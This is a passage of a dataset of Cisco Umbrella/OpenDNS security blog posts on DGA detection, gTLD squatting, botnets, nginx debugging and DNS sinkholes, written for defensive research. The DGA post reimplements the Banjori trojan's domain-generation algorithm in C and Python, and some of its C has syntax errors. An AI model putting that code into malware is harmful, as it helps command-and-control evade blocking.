Engineer in Belgium, was on site to receive the equipment and coordinate with the facility. While at the site, it is Wouter’s role to ensure all the equipment is functional, installed, cabled, powered, and connected to our management network. From there, members of the infrastructure engineering group work together from San Francisco and Vancouver to finish the provisioning and finalize all of the network services. Our engineers use a wide variety of tools like Ansible, Puppet, NetHarbour , custom automation, and other provisioning support systems to automate as much of the build as possible. From start to finish, an entire site takes fewer than four days. As we continue our accelerated pace of growth, OpenDNS will continue to grow its global presence. The incredible engineering teams of OpenDNS work tirelessly to ensure its users have the best experience possible. We process more than 70 Billion DNS Requests daily! That equates to more than 2 percent of the world’s Internet traffic! As the expansion continues, our global footprint marches on with it. Waiting for us to come to your region? Check our Global Network for new locations!", "date": "2015-04-08"},
{"website": "Cisco-Umbrella", "title": "Debugging the Cloud", "author": ["Aram Grigorian"], "link": "https://umbrella.cisco.com/blog/debugging-the-cloud", "abstract": "Today, OpenDNS runs many datacenters worldwide , providing content filtering and security services to millions of users. The Network Engineering team continuously ensures the Internet pipes are well connected and packets are flowing as quickly as possible between our users and servers. One of the systems my team has worked on, and continues to maintain, is OpenDNS’s HTTP proxy . At its core is Nginx. A cool thing about Nginx is how much you can get done just at the config level, but for maximum flexibility moving business logic into modules (C, or maybe Lua and now Javascript ) is the way to go. But custom modules equals custom code, and custom code equals testing and debugging. We test every feature, the developer is responsible for both the feature code and the associated tests. This ranges from unit tests, to integration, and to continuous monitoring in production. Any test that can be run continuously, is. We’ve added another neat feature to Nginx and dubbed it “X-Ray.” It allows us peek into the code flow for a given a request. Then, for example, if a customer has an issue, developers can mimic the scenario with X-Ray to aid debugging without having to shuffle routing configurations or restarting processes. Normally the error log is expected to have low verbosity in production, with only critical errors being printed to disk to keep performance as high as possible. With X-Ray we basically get the verbose version of error log (for custom code, not the nginx core) inline, appended to the response body. Here is a very simple redacted example; Normal request: > GET /malware.htm HTTP/1.1\n> User-Agent: curl/7.24.0\n> Accept: */*\n>\n< HTTP/1.1 302 Moved Temporarily\n< Connection: keep-alive\n< Location: https://malware.opendns.com/...\n<\n<html>\n<head><title>302 Found</title></head>\n<body bgcolor=\"white\">\n<center><h1>302 Moved Temporarily</h1></center>\n<hr><center>Umbrella Cloud Security Gateway</center>\n</body>\n</html> And with X-Ray, the response has additional info: < HTTP/1.1 302 Moved Temporarily\n< Connection: keep-alive\n< Location: https://malware.opendns.com/...\n<\n8 init_xray: xray level: 9 (NGX_LOG_DEBUG=8)\n8 .... : ==> preparing 000000000383E100, \"GET /malware.htm HTTP/1.1\"\n8 ... : no session args\n8 ... : header: \"User-Agent\"\n8 ... : header: \"Accept\"\n8 ... : header: \"Host\"\n...\n8 ... : ==> evaluating 000000000383E100, \"GET /malware.htm HTTP/1.1\"\n8 check_auth: pass: ....\n8 check_auth: ...\n...\n8 ...: uri-escaped user-agent: \"curl/7.24.0\"\n8 ...: block: as cat '1'\n8 ..._redirect: Location: \"https://malware.opendns.com/...\"\n...\n<html>\n<head><title>302 Found</title></head>\n<body bgcolor=\"white\">\n<center><h1>302 Moved Temporarily</h1></center>\n<hr><center>Umbrella Cloud Security Gateway</center>\n</body>\n</html> The code can now be full of useful information, from critical to very verbose all instantly accessible without hindering performance. And best of all, you can have this feature as well! Check out nginx-xray on our Github account and get coding!", "date": "2016-02-04"},
{"website": "Cisco-Umbrella", "title": "C is for Python", "author": ["Chip McSweeney"], "link": "https://umbrella.cisco.com/blog/python", "abstract": "Here at OpenDNS, we have handle a large amount of data. This comes in very handy for us researchers as we hunt for new threats, and bring to life new ways to protect our customers. Although I often describe my job as “playing with malware all day,” I neglect to mention that I follow the scientific method and engineer solutions out of the results. Python is a great tool, in that I can write programs to test my hypotheses and everyone can still read the program like well-written notes. While testing one of my most recent hypotheses however, I found that the solution although existed, it was incredibly slow in Python. Our goal is to find threats as early as possible and protect our customers from them before they are infected. Otherwise, we might as well be an antivirus company. Hypothetical DGA The majority of my recent work has revolved around something called a Domain Generation Algorithm (DGA). The fundamental concept of a DGA is that malware will use this algorithm to generate a series of domain names in a deterministic fashion. Computer science buzzwords aside, this means when malware tries to contact aaaa1111.com, then tries to contact aaab1112.com, it will likely continue by trying aaac1113.com, then aaad1114.com, etc. Assume each new domain is generated once per week and we want to block everything this DGA creates proactively. What domain is generated after aaaj1119.com has been used? If only all DGAs were this easy. It could be aaba1120.com, maybe aaak1120.com, maybe even aaaj111a.com if the last four digits are hexadecimal. It may not have even been safe to assume aaaj1119.com would ever be generated.  What if, after aaaf1116.com it generated aab01117.com? Well this is a fairly nice case, where time is not completely against me, and I can find a sample of malware that reaches out to these domains, reverse engineer it, find the DGA, rip it out, and make it talk. Hypothetically, lets say this DGA took a seed consisting of a number and a sequence of characters incrementing the number by one and the sequence of characters by one character until rolling over at 9 and z respectively for 100 domains before starting over. Good, aaaj1119.com does happen, the next is aaak1120.com, and aadw1211.com is the last domain generated. Block them all and job well done, right? Unfortunately not. As is usually the case, this hypothetical malware uses a seed to start its DGA (aaaa and 1111). Every time an updated version of the malware is released, there’s probably a new seed. If this was malware built from a kit, you can bet on every buyer having their own seed. Not a problem, we can block everything that begins with letters and ends with numbers… until nobody can reach office365.com or see San Francisco news on KRON4.com or any other legitimate domain that potentially crosses paths with the DGA. This occurs frequently in DGA research, so it is important to be more targeted in attempts to thwart DGA implementations. Continuing with this hypothetical DGA, I know I have massive amounts of data to assist me. I can programmatically find every sequence of domain requests for each user for a domain beginning with characters and ending with numbers, and the following domain requested beginning with characters and ending with numbers. If the second one would be next in sequence from the first using that DGA, then success, but that’s just a single pair. Is it the beginning of a sequence, the middle, or the end? Assuming the generation of 100 domains is never going to change, this one is relatively easy. I already know which IP is infected, and which domains are being requested, so it is nothing to lookup other users infected and full histories to find the first domain in the sequence. The first domain tells me the seed (new configuration) and I can then generate 100 in the future and be done with it. I can leave the program running and identify any new configurations almost immediately. Python’s limitations Let’s start with the fact the OpenDNS currently handles about 80 Billion DNS requests a day. It is very difficult to keep up with almost a million anything per second, especially with a language that is not compiled and optimized. Add the complexity of a real DGA and you have to be very conservative with your clock cycles per test. Once you remind yourself that there are in fact many DGAs each with different characteristics, you realize quickly that you might be a day behind by the first minute you start analyzing. The ideal solution is to use C wherever possible (C++ for you object people). C is for Python There are many ways to squeeze performance out of Python: Cython , PyPy , SWIG , etc., but my preferred method is to write the C as efficiently as possible for a performance dependent function (those related to the DGA especially), and wrap it manually for Python to import as a module. Why do I continue to use Python? Because it is easy for others to read and quick to modify; remember, the scientific method is an ongoing process, and modifications inevitable. The DGA however, does not change, and it is the most computationally complex, repetitive portion of my domain tests. So there is every reason to promote it to C as a Python module. A simple real example A banking trojan by the name Banjori had a pretty simple DGA. It took a seed domain like internetbadguys.com and only modified the first four characters to generate a series of domains.  An excellent resource on this particular DGA can be found here , including a very in-depth analysis on the algorithm itself. For each equation to generate the next letter, one of the characters is represented by its index in the alphabet (a=0, b=1, etc.), and the other characters involved are their ASCII integer. Those numbers are passed through the algorithm loosely represented below, and each new character is modulus 26 of the result added to 97 to get an ASCII character. Basic flow of Banjori DGA Using the example internetbadguys[.]com, the next five domains generated are: frqxrnetbadguys[.]com vpdbrnetbadguys[.]com pfkcrnetbadguys[.]com kgmgrnetbadguys[.]com jhnmrnetbadguys[.]com If you’d like to follow along in C, this should help: void nextBanjori (unsigned char* domain) { domain[0]=97+((domain[0]+domain[3]-97)%26); domain[1]=97+((domain[0]+(domain[1]<<1)-97)%26); domain[2]=97+((domain[0]+domain[2]-1-97)%26); domain[3]=97+((domain[1]+domain[2]+domain[3]-97)%26); } As mentioned above in Johannes Bader’s blog, the DGA is cyclical, meaning at some point the next domain generated will have already been generated and it will loop from that point ad infinitum. Bader also makes mention of “tail words,” which lead into loops, but never enter them. That means there are always two four letter words that can generate any four letter word that are part of a loop, but no four letter word can ever generate a tail word. This also means about half all possible four letter words are tail words, and the remaining are part of a loop. Efficiency now matters I need a targeted approach to block the entire loop of domains, including the tail word used. That is, if the sequence started with a tail word (remember, there is about a 50 percent chance the seed domain is a tail word). From the sequential domain set that I have captured from a user, I need to quickly determine if it could be the result of this DGA. Discard any domain shorter than [four letters] [‘.’] [top level domain] from the capture Is the length of the first domain equal to the length of the second domain? Are the substrings from the fifth element to the end for each domain equivalent? If these are both true, they are candidates, and the DGA should be applied to the first domain. If the first four letters of the domain post-DGA are now equivalent to the first four of the second domain, found one! Step one can be taken care of from whatever code monitors the domains from the stream of choice.  Steps two and three can be joined as one. Step four is already written, and step five can be a return true or false. int banjoriTest (unsigned char* domain1, unsigned char* domain2) {\n unsigned char[4] d1 = {domain1[0],domain1[1],domain1[2],domain1[3]}; int index = 4; while(domain1[index]) { if (!(domain1[index]==domain2[index])) { return 0; }\n  index++; } nextBanjori (d1);\n  for (index=0;index<4;index++) {\n    if (!(d1[index]==domain2[index])) {\n      return 0;\n    }\n  }\n  return 1; } That looks fairly efficient, but no major complexity. So we’ll keep that on the back-burner and just use Python for the time being. Assume this program ran with the functions above and the following pair passed the test: vfxlsatformalisticirekb[.]com and zvogsatformalisticirekb[.]com. Sweet, I have two of a chain which could be up to 15,373 domains long! Success? Not yet. I can block the entire loop right now. That sounds reasonable. Just continue with nextBanjori(domain2) repeatedly until I see domain2 again. Why not the first domain? Think about it, what if it was a tail domain. That loop could ruin your day. Now of course, you could alter it to break on the first or second domain, or serve yourself a nice heaping dish of the halting problem. You could even search the entire loop to see if the first domain was present. And if so, determine if it is or is not a tail word. If the first domain is in the loop, is there a tail domain missing or was one not used? Help has arrived! Introducing, sliced bread! Pattern searching abilities are now available! Ok, not quite sliced bread, but an incredibly useful tool available through investigate and the investigate API. I’ll just take the regular expression of any four characters followed by the rest of our first domain. Paydirt. Now I can cross-reference the the list I generated against the list from Investigate, and find the domain from Investigate that wasn’t generated, right? Guys? Right…? All 15,000 of them against the 16 found…? I know I’ve heard “memory is free” before, but there are other things running on these machines and I’m not the patient type. Milliseconds count. Reversing the DGA Not reverse engineering the DGA, as that’s already been done. If I have the generated domain, can I find the domain that generated it? Of course! There are always two ways to try to do this. Reverse the algorithm itself Iterate through all possible inputs and push them through the algorithm until the correct answer pops out One method will be slower, and reversing the algorithm isn’t always possible. But in this case, it is. I have managed to reverse it to a linear problem, rather than a search of size 26*26*26*26 (or 456,976). However , for the purpose of this example, we’re going to brute force this and pretend there is no other way, as is often the case. int isBanjoriTail (unsigned char* new) { int c0,c1,c2,c3; char[4] d; for (c0=97;c0<123;c0++) { for (c1=97;c1<123;c1++) { for (c2=97;c2<123;c2++) { for (c3=97;c3<123;c3++) { d[0]=c0 d[1]=c1; d[2]=c2; d[3]=c3; nextBanjori(d); if (d[0]==new[0] && d[1]==new[1] && d[2]==new[2] && d[3]==new[3]) { return 1; } } } } } return 0; } Remember, if anything can create the domain, it is not a tail. Otherwise, it is. To use and modify the code provided by Johannes Bader: def map_to_lowercase_letter(s): return ord('a') + ((s - ord('a')) % 26) def next_domain(domain): dl = [ord(x) for x in list(domain)] dl[0] = map_to_lowercase_letter(dl[0] + dl[3]) dl[1] = map_to_lowercase_letter(dl[0] + 2*dl[1]) dl[2] = map_to_lowercase_letter(dl[0] + dl[2] - 1) dl[3] = map_to_lowercase_letter(dl[1] + dl[2] + dl[3]) return ''.join([chr(x) for x in dl]) def isBanjoriTail(seed): for c0 in xrange(97,123): for c1 in xrange(97,123): for c2 in xrange(97,123): for c3 in xrange(97,123): domain = chr(c0)+chr(c1)+chr(c2)+chr(c3) domain = next_domain(domain) if seed.startswith(domain): return False return True seeds = { \"nhcisatformalisticirekb.com\", \"egfesatformalisticirekb.com\", \"qwfusatformalisticirekb.com\", \"eijhsatformalisticirekb.com\", \"siowsatformalisticirekb.com\", \"dhansatformalisticirekb.com\", \"zvogsatformalisticirekb.com\", \"yaewsatformalisticirekb.com\", \"wgxfsatformalisticirekb.com\", \"vfxlsatformalisticirekb.com\", \"usjssatformalisticirekb.com\", \"selzsatformalisticirekb.com\", \"nzjqsatformalisticirekb.com\", \"kencsatformalisticirekb.com\", \"fzkxsatformalisticirekb.com\", \"babysatformalisticirekb.com\" } for seed in seeds: print seed,isBanjoriTail(seed) Using this Python script, I averaged around 15 seconds to check the 16 domains and found babysatformalisticirekb.com to be the only tail in the list. Finally! Success. But at what cost? On with the C To witness the benefits of using C in Python, I copied the above functions “nextBanjori” and “isBanjoriTail” into banjoriTest.c, and created a corresponding banjoriTest.h header file. To use the C in Python, another C file must be created that imports python.h to create the Python wrapper for the C code. The Python docs explain how to do this in the extending and embedding section, with all the help building objects in the Python/C API Reference Manual . The wrapper must start the same way, but can return anything as long as it is a Python object. Following the wrapper There must be a method definition followed by a initialization function, both for Python to use. I saved the following as banjoriTestPy.c: #ifndef PYTHON_H #include<Python.h> #endif #ifndef BANJORITEST_H #include \"banjoriTest.h\" #endif static PyObject* banjori_tail(PyObject* self, PyObject* args) { const char* domain; if (!PyArg_ParseTuple(args, \"s\", &domain)) { return NULL; } int tf = isBanjoriTail((unsigned char*)domain); if (tf) { return Py_True; } else { return Py_False; } } static PyMethodDef BanjoriMethods[] = { {\"banjori_tail\", banjori_tail, METH_VARARGS, \"True or False is this a tail?\"}, {NULL, NULL, 0, NULL} }; PyMODINIT_FUNC initbanjori(void) { (void) Py_InitModule(\"banjori\", BanjoriMethods); } The last requirement is a simple Python program that directs Python to compile the C code into a library (I called mine setup_banjoriTestPy.py). from distutils.core import setup, Extension module1 = Extension('banjori', sources = ['banjoriTest.c','banjoriTestPy.c']) setup (name = 'BanjoriTest', version = '1.0', description = 'Test to see if a domain is a tail of banjori', ext_modules = [module1]) Run that program with Python with the argument “build” like this: python setup_banjoriTestPy.py build Python compiles the module and places it in a build/lib directory. Copy that file in the same directory as the Python program to use it and it can be imported immediately. import banjori seeds = { \"nhcisatformalisticirekb.com\", \"egfesatformalisticirekb.com\", \"qwfusatformalisticirekb.com\", \"eijhsatformalisticirekb.com\", \"siowsatformalisticirekb.com\", \"dhansatformalisticirekb.com\", \"zvogsatformalisticirekb.com\", \"yaewsatformalisticirekb.com\", \"wgxfsatformalisticirekb.com\", \"vfxlsatformalisticirekb.com\", \"usjssatformalisticirekb.com\", \"selzsatformalisticirekb.com\", \"nzjqsatformalisticirekb.com\", \"kencsatformalisticirekb.com\", \"fzkxsatformalisticirekb.com\", \"babysatformalisticirekb.com\" } for seed in seeds: print seed,banjori.banjori_tail(seed) In testing, it took 0.05 seconds to get through all 16 domains. That’s about 300 times faster than the Python version. An allowable exception Python is used because of its portability and forgiving nature. Reading someone else’s code is only slightly more difficult than writing it yourself. So is it acceptable to put C code in the mix? Absolutely. If the C function being wrapped for Python is cohesive, consistent, and could benefit from a speed boost, it is a perfect candidate. Speed is C’s best asset, and modularity is Python’s.  High speed C modules for Python? YES. Always yes. When given the choice between improving our customer’s online security 16 million DNS requests after a threat has been discovered, or 50,000 DNS requests after a threat has been discovered, I only see one option.", "date": "2015-11-12"},
{"website": "Cisco-Umbrella", "title": "The Cisco Umbrella Chromebook Client – Now Integrated with G Suite", "author": ["Phanikumar Dharmavarapu"], "link": "https://umbrella.cisco.com/blog/the-cisco-umbrella-chromebook-client-now-integrated-with-g-suite", "abstract": "How to ensure safe and secure digital learning experiences with the Cisco Umbrella Chromebook client — now integrated with G Suite Today, education has changed from traditional whiteboard learning to utilizing digital platforms and technology to enhance the learning experience. The majority of schools have adopted digital means to effectively communicate and collaborate with students, including G Suite collaboration applications, devices such as Chromebooks, and email. This has enabled increased productivity and collaboration among faculty, students, and parents. However, it has also opened up new challenges in securing digital communication and protecting students from falling victim to bad activity on the internet. Educational institutions need a way to quickly and easily protect their students and staff from threats on the internet. Last year, we announced the availability of the Cisco Umbrella Chromebook client to protect all of your Chromebook users against threats on the internet. Today, we’re thrilled to announce the availability of the G Suite integration for the Umbrella Chromebook client. With this integration, organizations using the Chromebook client can now easily apply policies for all of their Chromebook users by group. Let’s look at how the G Suite integration works to benefit both schools and students alike. Andrew – An IT administrator for a large school district As an admin, I want to make sure all students have safe and secure internet access. This starts with successfully on-boarding these students on their Chromebook devices. I create various logical groups (Organization Units) for students such as high school, middle school, and elementary school in the Google Admin Console so that I can easily manage policies and settings for each group. At the beginning of the school calendar, I create these OUs and add users to their respective groups. The challenge I faced was ensuring there were differentiated policies for these student groups. For example, elementary school students should not get access to social networking, whereas high school students are allowed to access to social networking sites. With the Umbrella Chromebook Client and G Suite identity service integration, it’s easy for me to apply these differentiated sets of security policies for each student group. Now, I can access the groups that were created in my admin console in the Umbrella dashboard. When a new student gets on-boarded, Umbrella automatically applies the appropriate security policy, which simplifies management and ensures that new users are protected with no action needed from me. Peter – A parent I always want to protect my child from internet content that is inappropriate or harmful. While I do this on my home internet, I had some concerns over the Chromebook device that my child’s school provided. I approached the school staff to better understand how they ensure the safety of my child from internet threats. During my conversation with the school’s Technology Director, Alicia, I learned that the school is equally concerned about safe access to the internet for students, staff, and guests. Not only do school policies require students are safe when accessing the internet, but also the Child Internet Protection Act (CIPA) requires internet safety policies for schools to receive E-rate funding. Here is how the conversation went: Ready to see Umbrella in action? The Umbrella Chromebook client is the smartest way to extend powerful protection against threats on the internet to Chromebook users, wherever they are. Management is now made even easier with the G Suite integration! Sign up for a free trial of Cisco Umbrella today to see for yourself!", "date": "2019-08-01"},
{"website": "Cisco-Umbrella", "title": "CnC? Botnet? Speak English Already!", "author": ["Vinny LaRiza"], "link": "https://umbrella.cisco.com/blog/cnc-botnet-english", "abstract": "Ever heard the saying “There is no such thing as a stupid question”? – of course you have, what a stupid question. This phrase was most likely meant to encourage people to ask questions. Then again, if you’re like me, if you come across a question as simple as “What is a Botnet?”, you feel a bit stupid for wanting to ask it. As I delve deeper into the wonderful rabbit hole that is Internet security research, I’ve encountered several questions that, while very simple to many of my coworkers and teammates, are confusing to someone like me. And if GI-JOE has taught me anything… I’m sure you’ve also heard “Education is the first step to success!” As time marches on, and with internet security becoming a bigger and bigger part of our everyday lives, this statement really couldn’t be more relevant – even to the point where I  almost want to change it to “Education is the first step to Internet Security.” (Hey marketing, check me out!) Where was I… Oh yes! BOTNETS! Let’s talk about botnets. If you look up the definition on Wikipedia , it states that a botnet is a “collection of internet-connected programs communicating with other, similar programs in order to perform tasks.” Welp, thanks Wikipedia, my work here is done. (Kidding!) Let’s break this down a bit. A botnet is a collection of compromised hosts (the ‘hosts’ being computers. a.k.a. YOUR computer), that are controlled by a single entity, usually through the use of a server known as a botnet controller (or the Mothership as I like to call it).  The goal of the botnet is to compromise/infect as many hosts as possible in order to create a large network of hosts (Regularships) that the botnet can then use to spread additional malware or spam, or perform a distributed denial-of-service (DDoS) attack. For example, a botnet can take a website offline by having all of the Regularships attack the website at the same time. Make sense? It’s kinda like in that book Ender’s Game when Ender eventually realizes that the alien ships are moving so perfectly in unison because they’re all being controlled by the single ship in the center of the formation. (p.s. If you’re annoyed by that pseudo spoiler, you shouldn’t be because that’s not even the best part of that book and the whole thing is great.) The underlying truth here is that unless you purposely installed the malware onto your computer/network, chances are you don’t want it there . This is where Umbrella comes in real handy. Not only do we use our extensive data collection network to create algorithms and classifiers to predict future attacks, we also provide you with the tools to pinpoint which computer (or computers) on your network are the source of the activity. With this information we can help you contain the attack, thus enabling you to connect to the Internet with a double dose of confidence. So yeah, that’s a botnet, in a nutshell…albeit a very oddly shaped nutshell. Stay tuned until next month when I try to compare phishing attacks to Toy Story 3 .", "date": "2014-05-23"},
{"website": "Cisco-Umbrella", "title": "Attack Prediction: Malicious gTLD Squatting May Be The Next Big Threat", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/malicious-gtld-squatting", "abstract": "Late last year, ICANN began expanding the generic Top-Level Domains (gTLDs). In addition to the standard .COM, .ORG, and .NET TLDs, over 1,300 new names could become available in the next few years. These new  gTLDs and internationalized domain names (IDNs) are awesome ideas if you think about the creativity sparked around the names one can possibly register. Some examples include .SINGLES (2013-08-28) and .SEXY (2013-09-11). Right before last holiday season, .CHRISTMAS (11-21-2013) was made available for use. We are seeing more interesting ones coming out such as .RICH (2013-11-21) and .MEME (01-30-2014). .WTF became available on 03-07-2014.  The full effective list and registration can be found at ICANN or Mozilla Public Suffix list . 204 new gTLD names were released between Oct 23, 2013 and April 04, 2014. DomainTools provides some excellent charts on the proliferation of the gTLDs. Security concerns and other risks around these new gTLDs have been extensively discussed as the new gTLD act rolls out. Unfortunately, the primary concern has focussed on traditional domain squatting for monetization purposes – and not on gTLD squatting for malicious purposes. According to a February 27, 2014 article published in Forbes by Daniel Fisher: [Domain squatters] might profit by snapping up domain names that happen to belong to well-known consumer brands. With the cost of dislodging a cybersquatter starting at a few hundred dollars and quickly escalating past $10,000 – with no possibility of imposing those costs back on the loser without engaging in even more expensive litigation — brand owners might find it easier to pay them to go away. With so many new gTLDs, perhaps it’s a good time to do a bit of data extraction and analysis here at OpenDNS. Using an hour time slice, on two different days, across all of OpenDNS’ 22 data centers we discovered some interesting usage statistics. Security Risk #1. Name Collisions Internal network entities are often named with a set of unofficial gTLDs that are not yet available for registration in the public domain name space, such as .CORP, .HOME, .SITE, .GLOBAL, .LOCALHOST, or .LOCAL. Attackers may register hostnames that purposefully collide with these internal names in an effort to see the traffic that is only supposed to be visible on the internal network. A good practice against such attacks is to use internal DNS resolvers and declare them as authoritative for internal TLDs. .LOCAL, among a number of other gTLDs, are in the ICANN reserved gTLD and are immune to the collision problem.  The following is the list of reserved gTLDs: AFRINIC  IANA-SERVERS  NRO   ALAC  ICANN  RFC-EDITOR   APNIC  IESG  RIPE  ARIN\nIETF  ROOT-SERVERS  ASO  INTERNIC  RSSAC  CCNSO  INVALID  SSAC  EXAMPLE  IRTF\nTEST  GAC  ISTF  TLD  GNSO  LACNIC  WHOIS  GTLD-SERVERS  LOCAL  WWW  IAB\nLOCALHOST  IANA  NIC .CORP, .HOME, .SITE aren’t yet in the public gTLD pool. However, .NETWORK is a different story. We’re seeing hundreds of thousands requests to .HOME.NETWORK,  largely due to routers’ WIFI lookup queries. None of the 3000 hostnames on .NETWORK are currently resolving, but we’ll probably see name collisions as soon as the attackers figure out how useful squatting on this particular gTLD can be. Some examples of the .HOME.NETWORK gTLDs that we are currently seeing include: tracker.openbittorrent.com.home.network localhost.home.network internalcheck.apple.com.home.network us.launcher.battle.net.home.network api.openweathermap.org.home.network us.patch.battle.net.home.network tracker.istole.it.home.network windows.home.network newuser.home.network desktop.home.network isatap.home.network master.home.network http.home.network nas.home.network As you can see, it would be quite easy for an attacker to register a number of commonly (and actively used) hostnames that a user’s computer might try to access outside of its home network. In fact, this ‘leakage’ is happening all over the world. Based on a quick query of yet-to-be-public gTLDs on April 5, 2014 we discovered 1,808 unique hosts leaking gTLD hostnames. A geographic distribution of these hosts can be seen below. The following chart shows the top 30 new gTLDs ranked by the number of unique hostnames queried. Security Risk #2. Phishing, Spamming, Typosquatting Phishing, spamming and typo squatting can take advantage of the much larger name space. In addition, some of these gTLDs like .BUSINESS, .ENTERPRISE or .WORK delivering a trustworthy business name will allow free or much cheaper name association compared to registering on .COM or .NET. For instance, facebookgame.directory is seen on the same IP (184.168.221.96) as www.coresfacebook.net , which is a known spam site. Some of other example names (not necessarily malicious) seen in OpenDNS traffic are: api.facebook.com.blue. api.facebook.com.business. api.facebook.com.life. b-api.facebook.com.internet.blue. graph.facebook.com.business. graph.facebook.com.casa. orcart.facebook.com.business. orcart.facebook.com.casa. orcart.facebook.com.life. puntlandpost.facebook.com.home.network. vh89cm7thwnvq1qc.www.facebook.com.network. www.facebook.com.hi.link. Another interesting domain that we found was: api.opendns.com.work. Security Risk #3: Are Designated Registrars for New gTLDs Easier to Compromise? There used to be only a handful root servers managing gTLDs and, historically speaking, these servers have been fairly secure and reliable. The new registrants of these gTLDs, however, could potentially be more easily compromised than their well-established peers. The same can be said of any new online service provider rushing to get operational too quickly. The gTLD names we’re seeing are allocated across roughly 200 registrars and the following chart shows the top 10, ranked by the number of unique names served. Security Risk #4. Too Little Information Generic Whois databases are not yet giving whois information on these domains and Google is not yet indexing these domains. The names appear to be in a huge Internet ‘fog’ that the world cannot yet peer into – a great scenario that attackers can take advantage of.  There is nothing we can find around these names except the traffic patterns we’re seeing at OpenDNS and the IP addresses some of them resolve to. Roughly 12% of names on the new gTLD now resolving a valid IPs. When evaluating the IP addresses we’re seeing, there are a good number associated with known malicious sites. One example of this is where fruit.directory is hosted – 72.52.4.90. We have observed this IP address hosting more than 170 malicious domains over the past week. OpenDNS Labs will continue to monitor and report on the usage of these new DNS names. Some final notes to consider: The defenders have yet to catch up with deriving methods for evaluating the security risks of these new TLDs, Many reputation based system are rendered useless with so little known about them. For example, we have established reputation indicators around existing TLDs such as .RU, .KZ. Those TLDs have a statistically larger ratio of bad domains vs. benign ones. Algorithmic detection methods need to pick up an entirely new spectrum of heuristics and indicators to correctly classify them. Samples from these new name spaces must be collected and analyzed before they can be used to derive machine learning models to classify the names in the new TLD space. That’s all for now. Look for future research on the proliferation of these in-the-wild gTLDs including how OpenDNS classifies the domains and has observed their use. Photo Credit: Skley via Compfight cc", "date": "2014-04-23"},
{"website": "Cisco-Umbrella", "title": "Building a Sinkhole That Never Clogs", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/dns-sinkhole", "abstract": "At OpenDNS, we frequently observe hosts and domain names whose features are similar to what we’ve previously seen with hosts serving malware, but still don’t exactly match a known pattern. While we want to block malicious content as soon as possible, we also want to keep false positives to a minimum. We don’t want to label a benign web site as Trojan/Generic.Win32 just because it is using Nginx, a non-English name, a previously inactive IP, and a dynamic DNS service. We need to gather evidence. Injected iframes on compromised sites can often be spotted right on the home page of a web site – but other infection vectors, other stages and C&C servers are less obvious. They might not use HTTP at all, and when they do, the exact path has to be known. This is why we occasionally need to study what kind of traffic is being sent to these names before labeling and possibly permanently blocking a new cluster of suspicious names. DNS records used by malware are rarely signed, and a DNS resolver can be used to temporarily redirect queries sent to highly suspicious domains to a box dedicated to passive traffic analysis instead, often referred to as a “sinkhole”. In this post, we’ll take a closer look at how we built a scalable DNS sinkhole. The C10M problem. “ It’s time for web servers to handle ten thousand clients simultaneously, don’t you think? “ Introduced circa 1999, Dan Kegel’s “C10K problem” refers to different techniques to handle ten thousand clients simultaneously on a single server, even though the traditional BSD sockets API had clearly not been designed to do so. Networking libraries such as Google’s Nitro hide the complexity of these techniques. Leveraging the same techniques, a high number of simultaneous clients has been achieved on different platforms such as Node.JS or Erlang . However, these achievements still required beefy servers, and a large amount of memory. Robert Graham’s excellent talk Defending the Internet at scale pointed out that the kernel network stack is a major bottleneck for scaling network servers. Data has to bounce back and forth between the kernel and userland processes, requiring scheduling, dispatching, copying and system calls. Nonetheless, 10 million connections or more can easily be achieved on commodity hardware by bypassing the kernel, and letting userland servers do the heavy lifting. He demonstrated this by releasing Masscan , a tool that can scan the entire Internet in under 6 minutes. The TCP 3-way handshake A TCP packet includes a header and an optional payload. When a connection to a server is being initiated by a client, two important 32-bit values are involved: a sequence number, and an acknowledgment number. A typical TCP connection begins with the following handshake: – The client sends a packet that includes Sc0 , a client-chosen sequence number. – The server replies with a packet that includes Ss0 , a server-chosen sequence number, as well as (Sc0 + 1) – The client sends a packet that includes (Sc0 + 1) , as well as (Ss0 + 1) . This third packet can, and usually does, include a payload. Although extensions exist in order to speed up the initial handshake (TFO, TCPCT), they are not widely deployed yet. Between the second and the third steps, the client checks that the packet received from the server actually includes (Sc0 + 1) . After the third step, the server checks that the received packet actually includes (Ss0 + 1) . If this is not the case, the packet is discarded. Provided that Sc0 and Ss0 cannot be predicted by an attacker, this mechanism makes blind injections more time-consuming than non-connected protocols such as UDP. The flip side is that the server has to remember what value had been chosen for Sc0 in order to verify the acknowledgement number sent by the client at the 3rd step. In addition, keeping states can quickly consume a lot of memory and CPU time. SYN flood attacks used to be a popular type of denial-of-service attacks exploiting this. Terminating a TCP connection In order to gracefully terminate a connection, three or four packets are normally required. Each side has to indicate its intent to close the connection, after verifying that the previously received packet acknowledges the correct sequence number. This usually means that states have to be kept until the very last packet. Although the intent is usually to indicate an error, sending a packet with the RST flag also terminates a connection. And unlike the previous scheme, the connection is terminated immediately and both ways. IPTrap2 Released circa 2000, IPtrap was a tool to log unexpected connections to well-known TCP ports. IPtrap2 is a complete rewrite, designed to securely and reliably process a high amount of traffic. The host we are running IPtrap2 on has two physical network interfaces: -The first interface is a management interface, that can only be reached from our local network. -The second interface is active, but not configured. It doesn’t have any IP addresses and the kernel doesn’t know of any routes to send packets through this interface. In fact, the kernel TCP/IP stack totally ignores it. In this context, how can packets get routed to this interface? All it actually takes for this to happen is to have an entry for it in the ARP table of the router. Even if the kernel TCP/IP stack ignores a physical network adapter, raw ethernet frames received by it can still be inspected by userland applications, provided that they have enough privileges to do so; raw frames can be injected as well. Thus, we run a minimal application that listens to ARP requests coming from the router, and replies with the IP address and the MAC address we want the router to fill its ARP table with. This is enough to have the router accept packets sent through this interface, as well as having it forward packets received for the sinkhole IP address. IPtrap2 itself also bypasses the kernel and directly reads and injects ethernet frames from/to the non-configured interface. When a TCP packet to initiate a new connection is received, and this packet’s sequence number is Sc0 , IPtrap2 replies with an acknowledgement whose sequence number Ss0 is the output of a keyed hash function: SS0 = Hk(source-ip || destination-ip || source-port || destination-port || uts) (with uts being a global time stamp updated every 64 seconds.) After receiving this acknowledgement, a client can follow through and send a new packet, this time with a payload. In order to mitigate spoofing attacks, this packet must include an acknowledgment number (Ss0 + 1) . When such a packet is received, the source and destination IP addresses and ports are decoded and a possible valid authentication tag for this packet is computed: t1 = 1 + Hk(source-ip || destination-ip || source-port || destination-port || uts) If t1 = (Ss0 + 1) , the client is very likely to have initiated the connection. If the received tag doesn’t match what was expected, it might be due to the global time stamp having changed between the acknowledgment sent by the server, and the tag verification. We thus compute a valid tag for the previous value of uts : t2 = 1 + Hk(source-ip 